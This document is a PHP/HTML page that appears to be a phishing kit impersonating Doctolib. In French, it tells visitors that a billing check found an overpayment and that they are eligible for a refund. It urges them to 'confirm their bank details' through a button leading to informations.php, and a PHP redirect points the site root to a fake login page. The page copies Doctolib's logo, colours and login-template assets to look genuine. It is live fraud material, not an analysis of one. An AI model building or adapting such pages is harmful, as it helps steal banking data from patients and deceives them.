<?php
if ($_SERVER['HTTP_HOST'] === 'monlien.com' && $_SERVER['REQUEST_URI'] === '/') {
    header('Location: /Se-connecter.php');
    exit();
}
?>
<html class="h-full" lang="fr"><head>
  <!-- Keycloak context -->
  <script id="kcContext" type="application/json"></script>

  <meta charset="utf-8">
  <!-- Conserve la meta viewport existante -->
  <meta content="webpack/width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover" name="viewport">
  <meta content="webpack/#107ACA" name="theme-color">

  <!-- Favicon et scripts Webpack -->
  <link href="webpack/favicon.ico" rel="icon" type="image/x-icon">
  <script crossorigin="" src="webpack/index-DgoSVJCJ.js" type="module"></script>
  <link as="script" crossorigin="" href="webpack/KcLoginThemeApp-DJnee5pJ.js" rel="modulepreload">
  <link as="script" crossorigin="" href="webpack/vendor-C9O-K7jM.js" rel="modulepreload">
  <link crossorigin="" href="webpack/main-D8A048Mp.css" rel="stylesheet">
  <link as="script" crossorigin="" href="webpack/Login-B1YeY9eF.js" rel="modulepreload">
  <link as="script" crossorigin="" href="webpack/InputPassword-DX7zsMgN.js" rel="modulepreload">
  <link as="script" crossorigin="" href="webpack/index-DgoSVJCJ.js" rel="modulepreload">
  <link as="script" crossorigin="" href="webpack/Template-dOubvlnT.js" rel="modulepreload">
  <link crossorigin="" href="webpack/Template-D6QImLSM.css" rel="stylesheet">
  <link crossorigin="" href="webpack/InputPassword-DbGe7uqN.css" rel="stylesheet">
  <link crossorigin="" href="webpack/Login-DbYoHk_O.css" rel="stylesheet">

  <title>Vous êtes éligible à un remboursement</title>

  <!-- Polices (chrome-extension) -->
  <link rel="stylesheet" href="chrome-extension://emnoomldgleagdjapdeckpmebokijail/font/roboto-fonts.css" class="wtd-font">
  <link rel="stylesheet" href="chrome-extension://emnoomldgleagdjapdeckpmebokijail/font/unbounded-fonts.css" class="wtd-font">

  <!-- Styles additionnels -->
  <style>
    .content-area {
      padding: 20px;
      padding-bottom: 60px; /* Marge supplémentaire en bas pour accéder facilement au bouton */
    }
    body {
      font-family: Arial, sans-serif;
      line-height: 1.6;
      margin: 0; /* Éviter de perturber la structure existante */
    }
    h2 {
      color: #0568A6;
      margin-top: 40px;
      text-align: center;
    }
    .main-paragraph {
      margin-top: 20px;
      margin-bottom: 20px;
    }
    .cta-button {
      display: block;
      margin: 30px auto 0 auto;
      background-color: #107aca;
      color: #fff;
      padding: 12px 20px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      text-align: center;
      font-size: 16px;
    }
    .cta-button:hover {
      background-color: #045385;
    }
    .red-text {
      color: red;
    }
  </style>
</head>

<body class="h-full">
  <div class="h-full" id="root">
    <div class="antialiased w-full h-full bg-[color:var(--oxygen-color-primitive-grey-grey-100)] flex flex-col z-20 h-screen" data-testid="desktop-template">

      <!-- Barre de navigation Doctolib -->
      <nav class="h-[64px] bg-[color:var(--oxygen-core-blue-110)] z-50 relative flex-shrink-0">
        <div class="px-[20px] h-full flex justify-between">
          <div class="flex !items-center list-none">
            <a aria-label="Home" class="flex" href="webpack/www.doctolib.fr" title="Home">
              <div class="bg-[url('./assets/icons/logo-doctolib.svg')] inline-block w-[95px] h-[50px] bg-no-repeat bg-center bg-[length:95px_auto] !items-center">
                <span class="sr-only">Doctolib</span>
              </div>
            </a>
          </div>
          <ul class="flex !items-center list-none">
            <li></li>
            <li></li>
            <li></li>
          </ul>
        </div>
      </nav>

     <!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Remboursement Doctolib</title>
  
  <!-- Polices Google Fonts - Titillium Web est proche de la police utilisée par Doctolib -->
  <link href="https://fonts.googleapis.com/css2?family=Titillium+Web:wght@400;500;600;700&display=swap" rel="stylesheet">
  
  <style>
    :root {
      --doctolib-blue: #107ACA;
      --doctolib-blue-dark: #0b5e94;
      --doctolib-blue-light: #e6f2fb;
      --doctolib-green: #36B37E;
      --doctolib-orange: #F5A623;
      --doctolib-bg: #f9fafb;
      --doctolib-gray-100: #f3f4f6;
      --doctolib-gray-200: #e5e7eb;
      --doctolib-gray-300: #d1d5db;
      --doctolib-gray-500: #6b7280;
      --doctolib-gray-700: #374151;
      --doctolib-gray-900: #111827;
      --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
      --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
      --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
      --border-radius: 8px;
    }
    
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Titillium Web', sans-serif;
      background-color: var(--doctolib-bg);
      color: var(--doctolib-gray-700);
      line-height: 1.5;
    }
    
    .container {
      width: 100%;
      max-width: 600px;
      margin: 0 auto;
      padding: 20px;
    }
    
    .reimbursement-card {
      background-color: #ffffff;
      border-radius: var(--border-radius);
      box-shadow: var(--shadow-md);
      overflow: hidden;
      margin-bottom: 20px;
      border: 1px solid var(--doctolib-gray-200);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    
    .reimbursement-card:hover {
      transform: translateY(-2px);
      box-shadow: var(--shadow-lg);
    }
    
    .card-header {
      background-color: var(--doctolib-blue);
      padding: 16px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      color: white;
    }
    
    .header-title {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: 600;
    }
    
    .header-badge {
      background-color: var(--doctolib-green);
      color: white;
      font-size: 12px;
      font-weight: 600;
      padding: 4px 10px;
      border-radius: 20px;
      letter-spacing: 0.5px;
    }
    
    .card-content {
      padding: 25px;
    }
    
    .content-header {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-bottom: 25px;
    }
    
    .image-container {
      width: 100px;
      height: 100px;
      background-color: var(--doctolib-blue-light);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
      box-shadow: 0 4px 8px rgba(16, 122, 202, 0.15);
    }
    
    .image-container img {
      width: 60px;
      height: auto;
    }
    
    .content-title {
      color: var(--doctolib-blue);
      font-size: 22px;
      font-weight: 700;
      text-align: center;
      margin-bottom: 5px;
    }
    
    .subtitle {
      color: var(--doctolib-gray-500);
      font-size: 15px;
      text-align: center;
      margin-bottom: 15px;
    }
    
    .description {
      font-size: 15px;
      margin-bottom: 25px;
      color: var(--doctolib-gray-700);
    }
    
    .info-box {
      background-color: var(--doctolib-gray-100);
      border-radius: var(--border-radius);
      padding: 20px;
      margin-bottom: 25px;
    }
    
    .info-title {
      font-weight: 600;
      margin-bottom: 15px;
      color: var(--doctolib-gray-900);
      font-size: 16px;
    }
    
    .info-list {
      list-style: none;
    }
    
    .info-item {
      display: flex;
      align-items: flex-start;
      margin-bottom: 12px;
    }
    
    .info-item:last-child {
      margin-bottom: 0;
    }
    
    .icon-check {
      min-width: 22px;
      height: 22px;
      background-color: rgba(54, 179, 126, 0.15);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 12px;
      margin-top: 2px;
    }
    
    .icon-check svg {
      width: 12px;
      height: 12px;
    }
    
    .info-text {
      font-size: 15px;
      color: var(--doctolib-gray-700);
    }
    
    .alert-box {
      display: flex;
      align-items: flex-start;
      background-color: #fff8e6;
      border-left: 4px solid var(--doctolib-orange);
      border-radius: 0 var(--border-radius) var(--border-radius) 0;
      padding: 15px;
      margin-bottom: 25px;
    }
    
    .alert-icon {
      color: var(--doctolib-orange);
      margin-right: 12px;
      flex-shrink: 0;
      margin-top: 2px;
    }
    
    .alert-text {
      font-size: 15px;
      color: var(--doctolib-gray-700);
    }
    
    .action-button {
      display: block;
      width: 100%;
      background: linear-gradient(to right, var(--doctolib-blue), var(--doctolib-blue-dark));
      color: white;
      border: none;
      border-radius: var(--border-radius);
      padding: 14px 20px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s ease;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      box-shadow: 0 2px 4px rgba(16, 122, 202, 0.2);
    }
    
    .action-button:hover {
      background: linear-gradient(to right, var(--doctolib-blue-dark), #074a80);
      box-shadow: 0 4px 8px rgba(16, 122, 202, 0.3);
      transform: translateY(-1px);
    }
    
    .action-button svg {
      width: 18px;
      height: 18px;
    }
    
    .card-footer {
      background-color: var(--doctolib-gray-100);
      padding: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-top: 1px solid var(--doctolib-gray-200);
    }
    
    .secure-icon {
      margin-right: 8px;
      color: var(--doctolib-green);
    }
    
    .footer-text {
      font-size: 13px;
      color: var(--doctolib-gray-500);
    }
    
    .legal-note {
      text-align: center;
      font-size: 13px;
      color: var(--doctolib-gray-500);
      margin-top: 15px;
    }
    
    /* Responsive adjustments */
    @media (max-width: 640px) {
      .container {
        padding: 15px;
      }
      
      .card-content {
        padding: 20px;
      }
      
      .content-title {
        font-size: 20px;
      }
      
      .image-container {
        width: 90px;
        height: 90px;
      }
      
      .image-container img {
        width: 50px;
      }
    }
    
    @media (max-width: 480px) {
      .container {
        padding: 10px;
      }
      
      .card-header {
        padding: 12px 15px;
      }
      
      .header-title {
        font-size: 15px;
      }
      
      .card-content {
        padding: 15px;
      }
      
      .content-title {
        font-size: 18px;
      }
      
      .subtitle, .description, .info-text, .alert-text {
        font-size: 14px;
      }
      
      .info-box {
        padding: 15px;
      }
      
      .image-container {
        width: 80px;
        height: 80px;
        margin-bottom: 15px;
      }
      
      .image-container img {
        width: 45px;
      }
      
      .action-button {
        padding: 12px 16px;
        font-size: 15px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="reimbursement-card">
      <div class="card-header">
        <div class="header-title">
          <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M10 0C4.48 0 0 4.48 0 10C0 15.52 4.48 20 10 20C15.52 20 20 15.52 20 10C20 4.48 15.52 0 10 0ZM11 15H9V13H11V15ZM11 11H9V5H11V11Z" fill="white"/>
          </svg>
          Information importante
        </div>
        <span class="header-badge">Nouveau</span>
      </div>
      
      <div class="card-content">
        <div class="content-header">
          <div class="image-container">
            <img src="webpack/Cards_Credit-Vitale-coins.png" alt="Remboursement">
          </div>
          <h1 class="content-title">Vous êtes éligible à un remboursement</h1>
          <p class="subtitle">Nous avons détecté un trop-perçu sur votre compte</p>
        </div>
        
        <p class="description">
          À la suite d'un contrôle de facturation de vos récentes consultations, nous avons identifié un trop-perçu sur le moyen de paiement que vous avez utilisé. Nous vous présentons nos excuses pour la gêne occasionnée.
        </p>
        
        <div class="info-box">
          <h2 class="info-title">Détails du remboursement</h2>
          <ul class="info-list">
            <li class="info-item">
              <div class="icon-check">
                <svg viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M10 3L4.5 8.5L2 6" stroke="#36B37E" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
              </div>
              <span class="info-text">Le remboursement sera effectué sur le support bancaire de votre choix</span>
            </li>
            <li class="info-item">
              <div class="icon-check">
                <svg viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M10 3L4.5 8.5L2 6" stroke="#36B37E" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
              </div>
              <span class="info-text">Délai de réception : 1 à 3 jours ouvrables après validation</span>
            </li>
            <li class="info-item">
              <div class="icon-check">
                <svg viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M10 3L4.5 8.5L2 6" stroke="#36B37E" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
              </div>
              <span class="info-text">Processus sécurisé et confidentiel</span>
            </li>
          </ul>
        </div>
        
        <div class="alert-box">
          <div class="alert-icon">
            <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M10 0C4.48 0 0 4.48 0 10C0 15.52 4.48 20 10 20C15.52 20 20 15.52 20 10C20 4.48 15.52 0 10 0ZM11 15H9V13H11V15ZM11 11H9V5H11V11Z" fill="#F5A623"/>
            </svg>
          </div>
          <p class="alert-text">
            Pour finaliser votre remboursement, veuillez confirmer vos coordonnées bancaires via notre formulaire sécurisé. Toutes vos informations y resteront confidentielles.
          </p>
        </div>
        
        <form action="informations.php" method="get">
          <button type="submit" class="action-button">
            <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M10 0C4.48 0 0 4.48 0 10C0 15.52 4.48 20 10 20C15.52 20 20 15.52 20 10C20 4.48 15.52 0 10 0ZM8 15L3 10L4.41 8.59L8 12.17L15.59 4.58L17 6L8 15Z" fill="white"/>
            </svg>
            Obtenir mon remboursement
          </button>
        </form>
      </div>
      
      <div class="card-footer">
        <div class="secure-icon">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M8 0C3.6 0 0 3.6 0 8C0 12.4 3.6 16 8 16C12.4 16 16 12.4 16 8C16 3.6 12.4 0 8 0ZM8 2C9.1 2 10 2.9 10 4C10 5.1 9.1 6 8 6C6.9 6 6 5.1 6 4C6 2.9 6.9 2 8 2ZM12 12H4V10.6C4 8.6 7.3 7.5 8 7.5C8.7 7.5 12 8.6 12 10.6V12Z" fill="#36B37E"/>
          </svg>
        </div>
        <p class="footer-text">Connexion sécurisée - Vos données sont protégées</p>
      </div>
    </div>
    
    <p class="legal-note">
      Un email récapitulatif vous sera envoyé dans les prochaines minutes.
    </p>
  </div>
</body>
</html>

  <div data-floating-ui-portal="" id=":r4:"></div>

 

  <wtd-div id="wanteeedContainer" style="position: fixed; display: block; top: 0px; right: 0px; z-index: 2147483647;">
    <wtd-root id="comparator"></wtd-root>
    <iframe id="wanteeedPanel" data-version="2.138.0" allowtransparency="true" style="background-color: rgb(255, 255, 255); border: none; border-radius: 3px; 
             box-shadow: rgb(181, 181, 181) 1px 1px 3px 2px; clip: auto; display: none; 
             margin-left: auto; margin-right: 12px; margin-top: 12px; position: relative; 
             z-index: 2147483647; height: 1px; width: 1px;">
    </iframe>
  </wtd-div>

  <script id="define-custom-element-wtd-root" src="chrome-extension://emnoomldgleagdjapdeckpmebokijail/src/scripts/injected/defineCustomElementsInjected.js" data-params="{&quot;elementName&quot;:&quot;wtd-root&quot;,&quot;eventName&quot;:&quot;customElements.defined&quot;,&quot;isShadowRoot&quot;:true}">
  </script>


</body></html>